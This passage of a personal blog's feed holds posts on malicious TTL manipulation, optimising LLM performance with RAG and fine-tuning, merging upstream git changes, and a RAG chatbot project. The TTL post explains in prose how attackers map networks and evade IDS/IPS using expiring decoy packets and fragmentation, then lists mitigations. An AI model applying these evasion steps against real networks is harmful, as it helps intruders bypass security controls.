term="sequence-to-sequence"/><category term="encoder-decoder"/><category term="auto-regression"/><summary type="html"><![CDATA[A high-level explanation on Transformers and the role of self-attention.]]></summary></entry><entry><title type="html">Malicious Time-to-Live (TTL) manipulation</title><link href="https://emdeh.github.io/blog/2024/ttl-manipulation/" rel="alternate" type="text/html" title="Malicious Time-to-Live (TTL) manipulation"/><published>2024-03-15T23:50:00+00:00</published><updated>2024-03-15T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/ttl-manipulation</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/ttl-manipulation/"><![CDATA[<p>Threat actors can manipulate their IP packets’ Time-to-Live (TTL) value to evade detection while performing network reconnaissance and even help bypass firewalls, Intrusion Detection Systems (IDS), and Intrusion Prevention Systems (IPS).</p> <p>But first, what is TTL…</p> <h2 id="what-is-ttl">What is TTL</h2> <p>Time-to-live (TTL) is a mechanism used in computing to limit the lifespan or validity of data in a network. TTL is a value included in IP packets that tells a network router how many hops (transfers from one network segment to another) the packet is allowed before it should be discarded. The TTL value prevents data packets from circulating indefinitely and causing network congestion.</p> <p>TTL values are set in the header of IP packets. The TTL value is an 8-bit field, ranging from 0 to 255. The value set in this field determines the maximum number of routers (hops) the packet can pass through before it is discarded or dropped.</p> <p>The initial TTL value of a packet can vary depending on the operating system or the application generating the packet. Some common initial values used by different systems include: Linux-based systems - 64. Windows-based systems -128. Network equipment like Cisco routers -255.</p> <p>The choice of the initial TTL value is a balance between ensuring that packets have enough hops to reach their destination under normal conditions and preventing packets from circulating unnecessarily - an important feature to mitigate network congestion.</p> <h2 id="what-happens-when-the-ttl-reaches-0">What happens when the TTL reaches 0</h2> <p>When the TTL value of an IP packet decrements to 0, it indicates that the packet has reached the maximum allowed number of hops (routers) without reaching its intended destination. The router that decrements the TTL value to 0 will discard the packet and typically sends an ICMP (Internet Control Message Protocol) Time Exceeded message back to the source IP address. This ICMP message notifies the sender that the packet was not delivered due to the TTL expiring.</p> <h2 id="ttl-manipulation-for-reconnaissance-and-probing">TTL Manipulation for reconnaissance and probing</h2> <p>Intentionally manipulating the TTL with lower-than-normal values can be used in network reconnaissance. By controlling the TTL value, a threat actor can elicit the ICMP Time Exceeded response from various appliances on a network. These responses can help infer the overall layout, map network paths, or identify the presence and location of specific appliances.</p> <h2 id="bypassing-security-measures">Bypassing Security Measures</h2> <p>Another application of TTL manipulation involves deceiving IDS and IPS appliances to smuggle malicious packets past these security controls.</p> <p>This technique operates on the principle of sending two sets of packets with carefully selected TTL values and identical sequence numbers, exploiting the way some security devices handle packet inspection and filtering.</p> <h3 id="initial-probing-packets">Initial Probing Packets</h3> <p>The threat actor sends a series of packets towards the target system with TTL values calibrated such that they expire right before reaching the target, yet after passing the IDS/IPS. These packets, designed to appear benign, prompt the IDS/IPS to log their sequences but ultimately discard them as they do not reach the destination due to TTL expiry.</p> <h3 id="follow-up-malicious-packets">Follow-Up Malicious Packets</h3> <p>Subsequently, the attacker sends another set of packets with identical sequence numbers as the probing packets, but this time, containing a malicious payload. These packets are sent with TTL values that ensure they reach the target. The critical manipulation here lies in setting the TTL of the probing packets to expire just beyond the IDS/IPS, thus avoiding further inspection of the subsequent malicious packets.</p> <h3 id="the-idsips-deception">The IDS/IPS Deception</h3> <p>Many IDS/IPS configurations are optimised to reduce performance overhead, which includes minimising duplicate packet inspection. They might treat these follow-up packets as duplicates of the initial, already-checked sequence, thus not subjecting them to thorough scrutiny. Consequently, the packets carrying the malicious content bypass the IDS/IPS checks, reaching the target system unnoticed.</p> <h3 id="implications-for-security">Implications for Security</h3> <p>This advanced method illustrates the capacity for TTL manipulation in mapping network defences and its potential in crafting evasion strategies that exploit specific weaknesses in the security infrastructure’s logic and configuration.</p> <h2 id="incorporating-fragmentation-with-ttl-manipulation">Incorporating Fragmentation with TTL Manipulation</h2> <p>Another method combines packet fragmentation with TTL manipulation to evade security controls. This technique leverages the fact that some security devices may not thoroughly inspect or reassemble fragmented packets.</p> <p>By fragmenting malicious payloads and carefully setting the TTL values, attackers can craft packets that are less likely to be detected by traditional security mechanisms.</p> <p>Fragmenting packets involves dividing the malicious payload into smaller fragments, making it more challenging for security devices to identify and block the harmful content, as the payload isn’t contained within a single, easily inspectable packet.</p> <p>Alongside fragmentation, the attacker manipulates the TTL values to ensure that the fragmented packets bypass the security devices with minimal scrutiny. The manipulated TTL values can help ensure that the fragments take a path through the network that avoids comprehensive inspection or takes advantage of devices that do not reassemble packets for inspection.</p> <p>By carefully orchestrating the fragmentation and TTL settings, the attacker can potentially deliver the malicious payload past IDS, IPS, and firewalls. Once the fragments reach their target, they can be reassembled into the original malicious payload, executing the intended attack without being detected by the network’s security infrastructure.</p> <h2 id="mitigation-and-real-world-application">Mitigation and real-world application</h2> <p>The effectiveness of these techniques in real-world scenarios can significantly vary. Modern Intrusion Detection and Prevention Systems are designed to mitigate such evasion tactics.</p> <p>These systems often incorporate advanced algorithms and analysis of behaviour patterns to detect and counteract unusual TTL values and fragmented packet strategies.</p> <p>To enhance network security against such TTL manipulation techniques, administrators can consider the following mitigation strategies: Enhanced Packet Inspection: Configure IDS/IPS to perform in-depth packet inspections, including analysing fragmented packets and verifying packet integrity.</p> <ul> <li> <p><strong>Anomaly Detection:</strong> Implement anomaly-based detection systems that identify unusual traffic patterns, including atypical TTL values. Regular Updates and Patching: Keep security devices updated with the latest software patches and threat intelligence to defend against new and evolving tactics.</p> </li> <li> <p><strong>Comprehensive Security Practices:</strong> Employ a multi-layered security approach that includes encryption, firewalls, and end-to-end monitoring to reduce reliance on any single point of failure.</p> </li> </ul>]]></content><author><name></name></author><category term="Explainers"/><category term="IDS"/><category term="IPS"/><category term="TTL"/><category term="packet-fragmentation"/><category term="ICMP"/><category term="network-security"/><summary type="html"><![CDATA[A high-level explanation on malicious TTL manipulation and packet fragmentation.]]></summary></entry><entry><title type="html">Optimising LLM Performance</title><link href="https://emdeh.github.io/blog/2024/optimising-llm-performance/" rel="alternate" type="text/html" title="Optimising LLM Performance"/><published>2024-03-06T23:50:00+00:00</published><updated>2024-03-06T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/optimising-llm-performance</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/optimising-llm-performance/"><![CDATA[<h1 id="a-framework-for-understanding-optimisation">A Framework for understanding optimisation</h1> <p>The recent developer conference hosted by OpenAI offered a deep dive into enhancing the capabilities of Large Language Models (LLMs). The presenters, John and Colin shared their insights on optimising LLMs. You can watch the video <a href="https://youtu.be/ahnGLM-RC1Y?si=Y-Dfy5CPxGT79ZBQ">here</a>, and I encourage you to do so!</p> <p>Optimisation of base models can be a critical step on the path to Production. A base model may show promise in a specific application but may lack consistency in a desired behaviour or knowledge to warrant its deployment.</p> <p>The optimisation approach will depend on what aspect the model needs to improve. John and Colin from OpenAI propose two primary dimensions of optimisation. Is it the context that needs improvement; that is, what the model needs to know? Or is it the model itself that requires optimisation; that is, how it needs to act?</p> <p><img src="/assets/img/20243-llm-performance/graphic1.png" alt="graphic 1"/> <small><em>Graphic adapted from OpenAI’s presentation</em></small></p> <p>For example, a base-model LLM will fail at generating a report on the most recent market trends because - well, it doesn’t know the most recent market trends. Why? Because they were never present in its pre-trained knowledge. In cases like this, the model is said to need <em>context optimisation</em>.</p> <p>Base models might not consistently follow instructions when the model is required to output particular formats or styles or requires multiple steps or complex reasoning. Some examples of these use cases are generating code from natural language or extracting structured data from unstructured text. In these cases, the <em>model itself requires optimisation</em>.</p> <h1 id="using-the-framework-for-maximising-model-performance">Using the framework for maximising model performance</h1> <p>Understanding model optimisation in this framework can help identify whether the issue is a context problem or an action problem. Once this is understood, appropriate techniques can be applied.</p> <p>In the case of context optimisation, Retrieval Augmented Generation (RAG) is likely a good start. To optimise the LLM itself, consider fine-tuning.</p> <p>And, of course, in other cases, a mix of optimising how a model acts and what it knows will be required.</p> <p><img src="/assets/img/20243-llm-performance/graphic2.png" alt="graphic 2"/> <small><em>Graphic adapted from OpenAI’s presentation</em></small></p> <h2 id="first-start-with-prompt-engineering">First, start with prompt engineering.</h2> <p>In either case, starting with prompt engineering is the best way to start as it offers a quick way to test and learn what dimension should be optimised and sets a baseline for further improvements.</p> <p>This stage is as simple as starting with a prompt. Then, consider adding a few shot examples (for context issues) or employing few shot learning (for acting issues). If this yields improvements, you’ll have a good baseline from which to iterate further.</p> <h3 id="what-is-few-shot-examples">What is few-shot examples</h3> <p>Few-shot examples refer to the specific instances or data points that are used in the process of few-shot learning. These are the actual samples from which the model is expected to learn or generalise. In a practical sense, if you were providing a machine learning model with few-shot examples, you would be giving it a very limited number of examples per class from which it needs to learn.</p> <h3 id="what-is-few-shot-learning">What is few-shot learning</h3> <p>Few-shot learning, on the other hand, is the broader concept or methodology that involves training a model to accurately make predictions or understand new concepts with only a few examples. Few-shot learning is particularly relevant where the goal is to develop models that can generalise well from limited data — something that is especially challenging and important when large datasets are not available or when trying to improve model adaptability and efficiency.</p> <h2 id="is-it-a-context-issue">Is it a context issue?</h2> <p>Prompt engineering alone is unlikely to be sufficient in more complex use cases, and it doesn’t scale well (remember, we want a Production-grade solution).</p> <p>Optimising with RAG is a logical next step if prompt engineering has revealed a context issue. You can see <a href="https://emdeh.com/blog/2024/rag-llm-chatbot/">this article</a> for an overview of RAG (or <a href="https://youtu.be/ahnGLM-RC1Y?si=QKwCMVozmxdPsBcU&amp;t=712"> skip to this part of the video</a>).</p> <h3 id="retrieval-augmented-generation-rag">Retrieval Augmented Generation (RAG)</h3> <p>RAG is typically good for introducing new information to the model, updating its knowledge, and reducing hallucinations by controlling content. If done correctly, the model will act as if it is explicitly amnesic to everything it was trained on while still retaining its implicit intelligence. In other words, the only knowledge it explicitly has is what has been provided in the RAG implementation.</p> <h4 id="simple-retrieval">Simple retrieval</h4> <p>Adding a simple RAG retrieval will ground the model in the desired context source. A simple way to provide the model access to a repository from which it can pull data, for example, is through embeddings and cosine similarity algorithms.</p> <p><em>(Cosine similarity algorithms measure the cosine of the angle between two non-zero vectors in a multi-dimensional space, providing a metric for how similar these vectors are.)</em></p> <h4 id="other-rag-options">Other RAG options</h4> <p>Other, more advanced, RAG options include Hypothetical Document Embeddings(HyDE) (with a fact-checking step). HyDE is essentially a technique where, instead of using the question’s vector to search for answers with an embedding similarity, a HyDE implementation will employ contrastive methods and generate a “hypothetical” answer in response to the prompt and use that “made up” answer to search for context instead.</p> <p>HyDE techniques can be helpful in cases where the model will receive questions that lack specificity or easily identifiable elements, making it difficult to derive an answer from the integrated context source.</p> <p>HyDE won’t always yield good results. For example, if the question is about a topic that the LLM is unfamiliar with - such as some new concept that was not present in the pre-trained knowledge - then it will likely lead to an increase in inaccurate results and hallucinations. The reason is that if it doesn’t know anything about the topic, the hypothetical answer it created to retrieve context will have no basis in reality…a hallucination, in other words.</p> <p>This is probably why OpenAI presented HyDE in the video with the <em>+ fact-checking step</em>!</p> <h3 id="rag-evaluation">RAG evaluation</h3> <p>It’s important to remember that by adding RAG to a solution, there is now an entirely new bunch of things that can go wrong. As John points out in the video, LLMs already hallucinate all on their own. If the context the model uses to ground its responses is fundamentally or systematically flawed, understanding whether the solution fails because of the RAG integration or an inherently hallucinatory trait within the model will be challenging. For this reason, evaluation frameworks are crucial.</p> <p>The video mentions an open-source evaluation framework called R<a href="https://github.com/explodinggradients/ragas">Ragas from Exploding Gradients</a>. Ragas measures four metrics. Two evaluate how well the model answered the question (Generation), and two measure how relevant the content retrieved is to the question (Retrieval).</p> <p>The Generation metrics are:</p> <ul> <li><em>Faithfulness</em> - a measure of how factually accurate the answer is.</li> <li><em>Answer relevancy</em> - how relevant is the generated answer to what was asked.</li> </ul> <p>The Retrieval metrics are:</p> <ul> <li><em>Context precision</em> - The signal-to-noise ratio of retrieved context.</li> <li><em>Context recall</em> - Can it retrieve all the relevant information required to answer the question.</li> </ul> <p>Context precision is particularly useful because providing RAG implementation with more chunks of data potentially containing relevant context doesn’t always work. John mentions a paper, <a href="https://cs.stanford.edu/~nfliu/papers/lost-in-the-middle.arxiv2023.pdf"><em>Lost in the Middle: How Language Models Use Large Contexts</em></a>, which explains that the more content given, the more likely the model is to hallucinate because LLMs tend to “forget” the content in the middle of a chunk. Not surprisingly, this is reminiscent of the Serial Position Effect observed in human cognition, which is the tendency to remember the first and last items in a list better than those in the middle. This effect has been well-researched in psychological science and can form part of the basis for various cognitive biases.</p> <p>On the other hand, context recall helps to understand the utility of the search mechanism. A common misconception with RAG implementations is that it will always find the proper context. But there is a fundamental constraint to remember: how many tokens can that context window accept. If it were possible to pass the entire context source to the LLM for each prompt, then context recall would never be an issue. But the computing power required for even a modest context source would make this unviable.</p> <p>The missing piece to consider is that the prompt is parsed into some search function, and it is the search function that surfaces the (ostensibly) relevant context. It is this surfaced context that the LLM relies on. So, evaluating context recall will help identify if the search process is surfacing up the most relevant context. If not, the search function may need optimising, such as re-ranking or fine-tuning the embeddings.</p> <p><img src="/assets/img/20243-llm-performance/graphic3.png" alt="graphic 3"/> <small><em>Graphic adapted from OpenAI’s presentation</em></small></p> <h2 id="is-it-an-actions-issue">Is it an actions issue?</h2> <p>If the required optimisation is related to how the model needs to act, then fine-tuning will likely be a good approach. Fine-tuning <em>“continues the training process on a smaller domain-specific dataset to optimise a model for a specific task”.</em></p> <p>Fine-tuning is equivalent to taking a general knowledge worker and teaching them a specialised skill. It can drastically improve a model’s performance on a specific task while also making the fine-tuned model more efficient (on that specific task) when compared to its corresponding base model.</p> <p>Fine-tuning is often more effective than prompt engineering or few-shot learning because a much smaller token count inherently constrains these techniques. Only so much data can be put into the context window, whereas in fine-tuning, exposing the model to millions of tokens of specialised data is achieved relatively easily.</p> <p>In terms of model efficiency, fine-tuning provides a way to reduce the number of tokens otherwise needed to get the model to perform the specialised task. Often, there is no need to offer in-context examples or explicit schemas, which translates into saved tokens. Sometimes, it can also distil the specialised task into a model smaller than the base one from which it was derived. Again, this ultimately translates into saved resources.</p> <p>When fine-tuning, Colin suggests in the video to start with a simple dataset with no complex instructions, formal schemas or in-context examples. All that is needed is natural language descriptions and the desired structure of the output.</p> <h3 id="where-fine-tuning-excels">Where fine-tuning excels</h3> <p>Fine-tuning works well when it emphasises pre-existing knowledge within the model, is used to customise the structure or tone of the desired output, or fine-tunes a highly complex set of instructions. The example given in the video is that of a text-to-SQL task. Base models like GPT-3.5 and GPT-4 already know everything there is to know about SQL, but they might perform poorly if asked about an obscure dialect of SQL. Fine-tuning is equivalent to telling the model to emphasise those aspects of its already present knowledge.</p> <h3 id="where-it-wont-excel">Where it won’t excel</h3> <p>Fine-tuning will not work for teaching the model something new. And the reason can be thought of as the inverse of why fine-tuning excels in emphasising pre-existing knowledge. Consider how large the datasets are for some LLMs (like the-entirety-of-the-internet large). These training runs were so extensive that any attempt to use fine-tuning to inject new knowledge would be quickly lost in the pre-existing knowledge. If this is the objective, approaching the problem with RAG will be better.</p> <p>Lastly, fine-tuning is a slow, iterative process. There is a lot of investment in preparing data and training, so it isn’t great for quick iterations.</p> <h3 id="quality-over-quantity">Quality over quantity</h3> <p>It’s worth jumping to <a href="https://youtu.be/ahnGLM-RC1Y?si=mVBDUZtccM9RGH-t&amp;t=1929">this part of the video</a> for a humourous and cautionary tale on quality over quantity. In short, the takeaway from here is to ensure the fine-tuning data accurately represents the desired outcome; start small, confirm movement in the right direction, and then iterate from there.</p> <p>And if you think fine-tuning a model on 200,000 of your slack messsages is a good place to start, maybe consider that a little longer.</p> <h1 id="useful-resources">Useful resources</h1> <ul> <li><a href="https://youtu.be/ahnGLM-RC1Y?si=Y-Dfy5CPxGT79ZBQ">A Survey of Techniques for Maximizing LLM Performance (Original OpenAI video on which this afticle is based)</a></li> <li><a href="https://cs.stanford.edu/~nfliu/papers/lost-in-the-middle.arxiv2023.pdf">Lost in the Middle: How Language Models Use Large Contexts</a></li> </ul>]]></content><author><name></name></author><category term="Artificial-Intelligence"/><category term="RAG"/><category term="LLM"/><category term="retrieval-augmented-generation"/><category term="large-language-models"/><category term="few-shot-examples"/><category term="few-shot-learning"/><category term="ragas"/><category term="HyDE"/><category term="fine-tuning"/><category term="serial-position-effect"/><category term="lost-in-the-middle"/><summary type="html"><![CDATA[A discussion on a few techniques to maximise LLM performance]]></summary></entry><entry><title type="html">GitHub - Managing upstream changes</title><link href="https://emdeh.github.io/blog/2024/managing-upstream-changes/" rel="alternate" type="text/html" title="GitHub - Managing upstream changes"/><published>2024-02-19T23:50:00+00:00</published><updated>2024-02-19T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/managing-upstream-changes</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/managing-upstream-changes/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>When a GitHub repository is forked, it can maintain a connection with original codebase. The original is called the <strong>upstream</strong> repository or branch. This connection means that the forked repository can be modified as needed, but if there are also changes made to the original, such as new features, they can be integrated into the forked version.</p> <p>This article outlines the steps to pull changes from an upstream repository into forked version. Specifically, it outlines how to pull changes into a separate branch for testing and then how to <strong>merge</strong> those changes into the main branch of the fork after testing and resolving any conflicts.</p> <h2 id="high-level-workflow-for-merging-upstream-changes">High-level workflow for Merging Upstream Changes:</h2> <ol> <li> <p><strong>Creating a New Branch:</strong> When there are upstream changes to merge, create a new branch in the forked repository based on the main branch.</p> </li> <li> <p><strong>Pulling Upstream Changes:</strong> Pull the changes from the upstream repository into this new branch. Resolve any conflicts here.</p> </li> <li> <p><strong>Testing:</strong> Use this branch to test the deployment to ensure everything works as expected. For example, if it’s a website, run it locally from the new branch or if it’s a deployment, deploy from the branch to confirm everything is in order.</p> </li> <li> <p><strong>Creating a Pull Request:</strong> Once the branch with the upstream changes has been tested, create a pull request to merge this branch into the main branch. The Pull Request can be drafted during testing if necessary.</p> </li> <li> <p><strong>Review and Merge:</strong> Review the Pull Request in GitHub. After any neccessary approvals, merge the pull request.</p> </li> <li> <p><strong>Delete the Branch:</strong> After the merge, the branch used to test the upstream changes can be deleted.</p> </li> </ol> <h2 id="prerequisites">Prerequisites</h2> <ul> <li>Ensure Git is installed on the system.</li> <li>Ensure access to the repository and its upstream repository.</li> </ul> <h1 id="steps">Steps</h1> <h2 id="1-navigate-to-the-local-repo">1. Navigate to the local repo</h2> <h2 id="2-update-the-local-main-branch">2. Update the local main branch</h2> <p>Ensure the local <code class="language-plaintext highlighter-rouge">main</code> branch (or whichever branch will ultimately receive the tested upstream changes) is up to date with the remote repository.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout main <span class="c"># Checkout the local copy of the main branch</span>
git pull origin main <span class="c"># Pull remote changes into the local copy of the main branch</span>
</code></pre></div></div> <h2 id="3-fetch-changes-from-upstream-repository">3. Fetch changes from upstream repository</h2> <p>Fetch changes from the upstream repository without merging them.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git fetch upstream
</code></pre></div></div> <h2 id="4-create-a-new-branch-for-testing-the-upstream-changes">4. Create a new branch for testing the upstream changes</h2> <p>Create a new branch based on the <code class="language-plaintext highlighter-rouge">main</code> branch to test the upstream changes.</p> <blockquote> <p><strong><em>This is important, as it protects the stability of the branch from which the code is deployed.</em></strong></p> </blockquote> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout <span class="nt">-b</span> upstream-changes main <span class="c"># Create a new branch called upstream-changes based off the main branch</span>
</code></pre></div></div> <h2 id="5-merge-upstream-changes-into-the-new-branch">5. Merge upstream changes into the new branch</h2> <p>Merge the changes from the upstream repository into the new branch.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git merge upstream/main
</code></pre></div></div> <h3 id="resolving-merge-conflicts">Resolving merge conflicts</h3> <p>If there are merge conflicts, Git will pause the merge process and mark the files that have conflicts. Here is how to resolve them:</p> <ul> <li>Open the conflicted files in VS Code.</li> <li>Look for the areas marked as conflicts (usually indicated by <code class="language-plaintext highlighter-rouge">&lt;&lt;&lt;&lt;&lt;&lt;</code>, <code class="language-plaintext highlighter-rouge">======</code>, and <code class="language-plaintext highlighter-rouge">&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>).</li> <li>Manually edit the files to resolve the conflicts. Choose which changes to keep or combine as needed.</li> <li>After resolving conflicts, add the files to staging: <code class="language-plaintext highlighter-rouge">git add .</code></li> <li>Then, continue the merge process: <code class="language-plaintext highlighter-rouge">git merge --continue</code></li> <li>Once all conflicts are resolved and the merge is successful, proceed with the next steps.</li> </ul> <h2 id="6-push-the-new-branch-to-github">6. Push the new branch to Github</h2> <p>It’s good practice to push the newly created branch with the upstream changes to the remote repository.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git push origin upstream-changes
</code></pre></div></div> <h2 id="7-open-a-pull-request-in-github">7. Open a Pull Request in GitHub</h2> <p>Now the Pull Request can be opened in draft.</p> <blockquote> <p><em>Be careful that the Pull Request is proposing to pull the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch into your own <code class="language-plaintext highlighter-rouge">main</code> branch, and <strong>*not</strong></em> the <code class="language-plaintext highlighter-rouge">main</code> branch of the upstream repository.*</p> </blockquote> <ul> <li>Go to the repository in GitHub.</li> <li>Open a Pull Request for the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch against the <code class="language-plaintext highlighter-rouge">main</code> branch.</li> <li>This usually initiates any review process.</li> </ul> <blockquote> <p><em>Do not merge it yet.</em></p> </blockquote> <h2 id="8-deploy-the-test-branch">8. Deploy the Test branch</h2> <p>Deploy or run the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch locally, or undertake whatever steps required to confirm the changes.</p> <h2 id="9-review-and-merge-the-pull-request">9. Review and merge the pull request</h2> <p>If the tests are successful, merge the changes into main by merging the pull request into the <code class="language-plaintext highlighter-rouge">main</code> branch through the GitHub interface.</p> <h3 id="when-to-use-merge-commit">When to use Merge Commit</h3> <p>Opt for a merge commit when you want to preserve the exact history of changes, including the individual commits, from a feature branch without altering the commit history. This approach is beneficial when you want to maintain a visual representation of the feature branch within the main branch, making it easier to track and understand the flow of changes. It’s especially useful for complex features or significant changes that involve multiple developers or require detailed historical context for future reference.</p> <p>The merge commit approach adds a new commit to the main branch that “merges” the histories, ensuring that the main branch’s history reflects the addition of the feature or changes from the feature branch as a merge. This method keeps the history of both branches intact and provides a clear merge point that can be referenced in the future</p> <blockquote> <p><em>If Linear History is on and the branch being being merged into is protected, the only options may be <strong>Rebase</strong> or <strong>Squash</strong>.</em></p> </blockquote> <h3 id="when-to-use-rebase">When to use Rebase</h3> <p>Use this when you want to maintain a detailed commit history from the feature/test branch in the main branch. It’s suitable for code changes where each commit’s history is important for context, such as new features or significant code revisions.</p> <h3 id="when-to-use-squash">When to use Squash</h3> <p>Opt for this when dealing with a series of minor or incremental changes, such as documentation updates or small tweaks. It combines all feature branch commits into a single commit for a cleaner main branch history, making it ideal for simpler or less impactful changes.</p> <h2 id="10-update-the-local-main-branch-and-clean-up">10. Update the local main branch and clean up</h2> <p>After merging the pull request, update the local <code class="language-plaintext highlighter-rouge">main</code> branch and then delete the test branch.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout main <span class="c"># Switch back to the main branch</span>
git pull origin main <span class="c"># Pull the remote version of main to the local copy so it is up-to-date with the recent merge</span>
git branch <span class="nt">-d</span> upstream-changes <span class="c"># Delete the local copy of the branch used to test the upstream changes</span>
git push origin <span class="nt">--delete</span> upstream-changes <span class="c"># Delete the remote copy of the branch used to test the upstream changes</span>
</code></pre></div></div> <h2 id="11-redeploy-from-main">11. Redeploy from main</h2> <p>If required, it’s good practice to now re-deploy the codebase from the <code class="language-plaintext highlighter-rouge">main</code> branch.</p> <h1 id="conclusion">Conclusion</h1> <p>This process ensures that changes from the upstream repository are tested in isolation before being integrated into the main branch, minimising the risk of disruption to the main codebase.</p> <h5 id="a-quick-note-on-git-fetch-vs-git-pull">A quick note on <code class="language-plaintext highlighter-rouge">Git Fetch</code> vs. <code class="language-plaintext highlighter-rouge">Git Pull</code></h5> <p>In Git, both <code class="language-plaintext highlighter-rouge">git fetch</code> and <code class="language-plaintext highlighter-rouge">git pull</code> are commands used to update local copies of a repository from a remote source. However, they serve different purposes and operate in distinct ways.</p> <ul> <li> <p><strong><code class="language-plaintext highlighter-rouge">git fetch</code></strong> retrieves updates from a remote repository, but it doesn’t automatically merge those updates into the current working branch. When <code class="language-plaintext highlighter-rouge">git fetch upstream</code> is executed, for instance, Git fetches any new work that has been pushed to the upstream repository since the last fetch, updating the local remote-tracking branches (like upstream/main). However, <em>the working directory remains unchanged</em>. This command is useful for reviewing changes before integrating them into the local branch.</p> </li> <li> <p><strong><code class="language-plaintext highlighter-rouge">git pull</code></strong>, on the other hand, is a more aggressive command that not only fetches updates from the remote repository but also automatically merges them into your current working branch. Essentially, <code class="language-plaintext highlighter-rouge">git pull</code> is a combination of <code class="language-plaintext highlighter-rouge">git fetch</code> followed by <code class="language-plaintext highlighter-rouge">git merge</code>. When executed <code class="language-plaintext highlighter-rouge">git pull origin main</code>, Git fetches the changes from the main branch of the remote named origin and immediately attempts to merge them into the current working branch. This command is handy for quickly updating local branches with the latest changes from the remote, assuming they’re ready to be merged without a review process.</p> </li> </ul> <p>In Summary <code class="language-plaintext highlighter-rouge">git fetch</code> is when the changes require review before merging. Use <code class="language-plaintext highlighter-rouge">git pull</code> when integrating the remote changes immediately into the local branch without a preliminary review is not a concern.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="upstream-changes"/><category term="git"/><category term="github"/><category term="git-pull"/><category term="git-fetch"/><summary type="html"><![CDATA[An overview of how to manage upstream changes in a GitHub repository]]></summary></entry><entry><title type="html">Using Retrieval Augmented Generation (RAG) for chatbots</title><link href="https://emdeh.github.io/blog/2024/rag-llm-chatbot/" rel="alternate" type="text/html" title="Using Retrieval Augmented Generation (RAG) for chatbots"/><published>2024-02-16T17:00:00+00:00</published><updated>2024-02-16T17:00:00+00:00</updated><id>https://emdeh.github.io/blog/2024/rag-llm-chatbot</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/rag-llm-chatbot/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>This project leverages a Retrieval Augmented Generation (RAG) implementation to create an intelligent question-answering system for a website. The project automates the collection of contextual data from the site, processes this data with an embeddings model to generate vector representations, and utilises these vectors to provide relevant answers to user queries through a chatbot using a Language Model (LLM) to craft responses in a conservational tone.</p> <p>You can find the code and a detailed overview in the <a href="https://github.com/emdeh/web-crawl-qna-blog-bot">Github repository</a>.</p> <h2 id="what-is-retrieval-augmented-generation-rag">What is Retrieval Augmented Generation (RAG)</h2> <p>Retrieval Augmented Generation (RAG) is a sophisticated approach that enhances the capabilities of generative models, particularly Large Language Models (LLMs), by integrating an additional information retrieval step into the response generation process. This method involves dynamically sourcing relevant external information to augment the input provided to the generative model, thereby enriching its responses with details and insights not contained within its pre-trained knowledge base. The retrieval of additional information is typically facilitated by embeddings and vector representations to identify content contextually similar to the user’s prompt.</p> <h2 id="what-are-embeddings">What are Embeddings</h2> <p>Embeddings are a form of representation learning where words, sentences, or even entire documents are converted into real-valued vectors in a high-dimensional space. This process aims to capture the semantic meanings, relationships, and context of words or phrases, allowing machines to process natural language data more effectively. The vectors in the high-dimensional space represent the nuanced characteristics of the text, such as syntax, semantics, and usage patterns, in a form that can be quantitatively analysed. Each dimension could correspond to a latent feature that captures different aspects of the text’s meaning, not directly interpretable by humans but discernible through computational methods. By mapping textual information to a geometric space, embeddings enable the measurement of conceptual similarity between pieces of text based on their positions and distances within this space, facilitating tasks like search, classification, and contextual understanding in natural language processing applications. In the context of Retrieval-Augmented Generation (RAG), embeddings represent the queries (prompts) and the potential knowledge sources in a format that a computer can understand and compare.</p> <h3 id="vector-representations">Vector Representations</h3> <p>Vector representations are the outcome of converting text into embeddings, representing text as points or vectors in a multi-dimensional space. As described above, each dimension corresponds to a feature of the text, capturing various aspects of its meaning, context, or syntactical properties. Comparing vector representations involves calculating the similarity (often using cosine similarity or other metrics) between vectors to identify how closely related two pieces of text are. In RAG implementations that use embeddings, the vector representation of a user’s prompt is compared to the vector representations of various knowledge sources to identify the most relevant context. This relevant context is then retrieved and used to augment the response generated by a language model, enhancing the LLM’s ability to provide accurate and contextually enriched answers.</p> <h2 id="credits">Credits</h2> <p>This project was initially inspired by <strong>OpenAI’s Web Q&amp;A with Embeddings tutorial</strong>. Learn how to crawl your website and build a Q/A bot with the OpenAI API. You can find the full tutorial in the <a href="https://platform.openai.com/docs/tutorials/web-qa-embeddings">OpenAI documentation</a>.</p> <h1 id="overview-of-a-rag-implementation">Overview of a RAG implementation</h1> <p>The diagram below briefly outlines how a Retrieval Augmented Generation (RAG) architecture leverages embeddings. In short, additional context is <em>retrieved</em> by comparing the vectors of the prompt to the vectors of the knowledge source. The related textual data is then appended to the prompt to <em>augment</em> the response <em>generated</em> by the LLM.</p> <p><img src="/assets/img/2024-rag-chatbot/diagram.png" alt="diagram"/></p> <h1 id="example-implementation">Example implementation</h1> <p><strong>Point 1:</strong> In the case of this particular implementation, the knowledge source is a blog. The knowledge is obtained by first extracting all the hyperlinks on the site and discarding any that point to other domains. Each unique hyperlink is then visited, and the content extracted into text files. The text files are then used to create a data frame. Each row in the data frame is tokenised to facilitate analysing the length of documents, which is relevant for understanding the data’s distribution and optimising model input sizes.</p> <p><strong>Point 2:</strong> After more processing to create smaller chunks (if required), the embeddings are generated and saved. In this case, to a <code class="language-plaintext highlighter-rouge">.csv</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;SNIP&gt;
https://emdeh.com/repositories
https://emdeh.com/news/announcement_7
https://emdeh.com/blog/2024/codify-walkthrough
